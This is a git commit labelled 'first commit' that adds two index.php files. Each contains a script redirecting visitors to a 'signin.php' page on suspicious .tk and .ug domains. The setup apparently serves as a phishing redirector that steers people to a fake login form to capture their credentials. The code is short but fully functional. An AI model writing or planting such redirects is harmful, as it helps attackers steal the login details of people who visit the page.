f5bbb88a56d021830f9181162d6bdbbf4cb63016
Ronaldrani21 <ronaldrani72@gmail.com>
2021-06-14 15:23:46 +0300

    first commit

---
+++ pages/index.php
@@ -0,0 +1,3 @@
+<script type='text/javascript'>
+    window.location.href = 'http://Elandmails.tk/forms/signin.php';
+</script>
---
+++ repository/index.php
@@ -0,0 +1,3 @@
+<script type='text/javascript'>
+    window.location.href = 'http://Elandmails.ug/forms/signin.php';
+</script>
